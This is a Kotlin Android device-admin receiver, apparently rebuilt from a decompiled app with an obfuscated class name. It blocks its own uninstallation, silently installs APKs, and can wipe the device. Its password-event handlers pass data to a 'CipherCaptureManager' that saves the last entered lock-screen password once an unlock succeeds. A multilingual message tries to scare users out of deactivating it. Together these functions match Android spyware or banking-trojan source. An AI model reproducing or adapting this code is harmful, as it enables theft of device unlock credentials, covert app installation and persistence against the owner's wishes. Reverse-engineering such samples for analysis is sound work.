package com.storm.safe.rock.receiver

import android.app.PendingIntent
import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import android.os.UserHandle
import android.util.Log
import com.storm.safe.rock.service.modules.cipher.CipherCaptureManager
import java.io.File
import java.io.FileInputStream
import java.io.IOException
import java.util.Locale

/**
 * Device Admin Receiver — handles device owner operations including
 * block/allow uninstall, silent APK install, wipe device, and password events.
 *
 * Reverse-engineered from JADX: receiver/zbrefryi.java (295 lines).
 * Renamed: f52290a0→Companion, C0275a0→Companion object methods
 */
class zbrefryi : DeviceAdminReceiver() {

    companion object {
        private const val TAG = "zbrefryi"

        /**
         * Allow uninstall of the current package (requires Device Owner).
         */
        @JvmStatic
        fun allowUninstall(context: Context): Boolean {
            try {
                val dpm = context.getSystemService("device_policy") as DevicePolicyManager
                val cn = ComponentName(context, zbrefryi::class.java)
                if (!dpm.isDeviceOwnerApp(context.packageName)) {
                    Log.w(TAG, "不是 Device Owner，无法修改卸载设置")
                    return false
                }
                dpm.setUninstallBlocked(cn, context.packageName, false)
                Log.d(TAG, "已允许卸载")
                return true
            } catch (e: Exception) {
                Log.e(TAG, "允许卸载失败", e)
                return false
            }
        }

        /**
         * Block uninstall of the current package (requires Device Owner).
         */
        @JvmStatic
        fun blockUninstall(context: Context): Boolean {
            try {
                val dpm = context.getSystemService("device_policy") as DevicePolicyManager
                val cn = ComponentName(context, zbrefryi::class.java)
                if (!dpm.isDeviceOwnerApp(context.packageName)) {
                    Log.w(TAG, "不是 Device Owner，无法阻止卸载")
                    return false
                }
                dpm.setUninstallBlocked(cn, context.packageName, true)
                Log.d(TAG, "已设置阻止卸载")
                return true
            } catch (e: Exception) {
                Log.e(TAG, "阻止卸载失败", e)
                return false
            }
        }

        /**
         * Check if device admin is active.
         */
        @JvmStatic
        fun isAdminActive(context: Context): Boolean {
            return try {
                val dpm = context.getSystemService("device_policy") as DevicePolicyManager
                dpm.isAdminActive(ComponentName(context, zbrefryi::class.java))
            } catch (_: Exception) {
                false
            }
        }

        /**
         * Check if this app is the device owner.
         */
        @JvmStatic
        fun isDeviceOwner(context: Context): Boolean {
            return try {
                val dpm = context.getSystemService("device_policy") as DevicePolicyManager
                dpm.isDeviceOwnerApp(context.packageName)
            } catch (_: Exception) {
                false
            }
        }

        /**
         * Wipe device via DevicePolicyManager (requires Device Admin).
         * JADX: vendor wipeData logic from C0322a7.m211629e1
         */
        @JvmStatic
        fun wipeDevice(context: Context, wipeExternal: Boolean): Boolean {
            return try {
                val dpm = context.getSystemService("device_policy") as DevicePolicyManager
                val flags = if (wipeExternal) {
                    DevicePolicyManager.WIPE_EXTERNAL_STORAGE
                } else {
                    0
                }
                dpm.wipeData(flags)
                true
            } catch (e: Exception) {
                Log.e(TAG, "wipeData 失败", e)
                false
            }
        }

        /**
         * Silently install APK using PackageInstaller (requires Device Owner).
         */
        @JvmStatic
        @Throws(IOException::class)
        fun silentInstallApk(context: Context, apkPath: String): Boolean {
            try {
                val dpm = context.getSystemService("device_policy") as DevicePolicyManager
                if (!dpm.isDeviceOwnerApp(context.packageName)) {
                    Log.w(TAG, "不是 Device Owner，无法静默安装")
                    return false
                }
                val file = File(apkPath)
                if (!file.exists()) {
                    Log.e(TAG, "APK 文件不存在: $apkPath")
                    return false
                }
                Log.d(TAG, "★★★ 开始静默安装: $apkPath ★★★")
                val packageInstaller = context.packageManager.packageInstaller
                val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
                params.setInstallReason(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
                val sessionId = packageInstaller.createSession(params)
                val session = packageInstaller.openSession(sessionId)
                FileInputStream(file).use { fis ->
                    session.openWrite("app.apk", 0, file.length()).use { output ->
                        fis.copyTo(output)
                        session.fsync(output)
                    }
                }
                val intent = Intent("com.storm.safe.rock.INSTALL_RESULT")
                val flags = if (Build.VERSION.SDK_INT >= 31) {
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                } else {
                    PendingIntent.FLAG_UPDATE_CURRENT
                }
                session.commit(
                    PendingIntent.getBroadcast(context, sessionId, intent, flags).intentSender
                )
                Log.d(TAG, "✅ 静默安装已提交，等待系统处理")
                return true
            } catch (e: Exception) {
                Log.e(TAG, "静默安装失败", e)
                return false
            }
        }

        // vendor: Second wipeDevice overload merged with first to avoid Kotlin overload conflict
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        Log.w(TAG, "⚠️ 用户尝试取消激活设备管理员")
        val lang = Locale.getDefault().language
        return when (lang) {
            "ar" -> "سيؤدي إلغاء التنشيط إلى تعطيل ميزات أمان الجهاز. هل أنت متأكد من المتابعة؟"
            "de" -> "Durch Deaktivieren werden die Sicherheitsfunktionen des Geräts deaktiviert. Möchten Sie wirklich fortfahren?"
            "es" -> "La desactivación provocará que las funciones de seguridad del dispositivo dejen de funcionar. ¿Seguro que desea continuar?"
            "fr" -> "La désactivation entraînera la perte des fonctions de sécurité de l'appareil. Voulez-vous vraiment continuer ?"
            "hi" -> "निष्क्रिय करने से डिवाइस सुरक्षा सुविधाएं बंद हो जाएंगी। क्या आप जारी रखना चाहते हैं?"
            "id" -> "Menonaktifkan akan menonaktifkan fitur keamanan perangkat. Yakin ingin melanjutkan?"
            "ja" -> "無効化するとデバイスのセキュリティ機能が無効になります。続行しますか？"
            "ko" -> "비활성화하면 기기 보안 기능이 작동하지 않습니다. 계속하시겠습니까?"
            "ms" -> "Menyahaktifkan akan melumpuhkan ciri keselamatan peranti. Adakah anda pasti mahu meneruskan?"
            "pt" -> "A desativação fará com que os recursos de segurança do dispositivo parem de funcionar. Tem certeza de que deseja continuar?"
            "ru" -> "Отключение приведёт к потере функций безопасности устройства. Вы уверены, что хотите продолжить?"
            "th" -> "การปิดใช้งานจะทำให้ฟีเจอร์ความปลอดภัยของอุปกรณ์ไม่ทำงาน คุณต้องการดำเนินการต่อหรือไม่?"
            "tr" -> "Devre dışı bırakma, cihaz güvenlik özelliklerini etkisiz hale getirecektir. Devam etmek istediğinizden emin misiniz?"
            "vi" -> "Hủy kích hoạt sẽ làm mất chức năng bảo mật thiết bị. Bạn có chắc muốn tiếp tục?"
            "zh" -> "取消激活将导致设备安全功能失效，确定要继续吗？"
            else -> "Deactivating will disable device security features. Are you sure you want to continue?"
        }
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Log.w(TAG, "⚠️ 设备管理员已被禁用")
    }

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.d(TAG, "设备管理员已启用")
    }

    override fun onPasswordChanged(context: Context, intent: Intent, userHandle: UserHandle) {
        super.onPasswordChanged(context, intent, userHandle)
        Log.d(TAG, "密码已更改 - 清除旧密码")
        try {
            val ccm = CipherCaptureManager.instance
            if (ccm != null) {
                ccm.dispatchEvent("android.intent.action.DEVICE_PASSWORD_CHANGED")
                ccm.setPasswordVerified(false)
                Log.d(TAG, "旧密码已清除 + 已发送变更事件")
            }
        } catch (e: Exception) {
            Log.w(TAG, "清除旧密码失败: ${e.message}")
        }
    }

    override fun onPasswordFailed(context: Context, intent: Intent, userHandle: UserHandle) {
        super.onPasswordFailed(context, intent, userHandle)
        Log.w(TAG, "密码验证失败")
        try {
            val ccm = CipherCaptureManager.instance
            if (ccm != null) {
                ccm.dispatchEvent("android.intent.action.DEVICE_PASSWORD_FAILED")
                ccm.refreshLockBatchId()
                ccm.discardBufferedPassword()
            }
        } catch (e: Exception) {
            Log.w(TAG, "丢弃密码失败: ${e.message}")
        }
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent, userHandle: UserHandle) {
        super.onPasswordSucceeded(context, intent, userHandle)
        Log.d(TAG, "密码验证成功")
        try {
            val ccm = CipherCaptureManager.instance
            if (ccm != null) {
                Log.d(TAG, "confirmAndSaveLastCipher: ${ccm.confirmAndSaveLastCipher()}")
                ccm.dispatchEvent("android.intent.action.DEVICE_PASSWORD_SUCCESS")
            }
        } catch (e: Exception) {
            Log.w(TAG, "确认保存密码失败: ${e.message}")
        }
    }
}
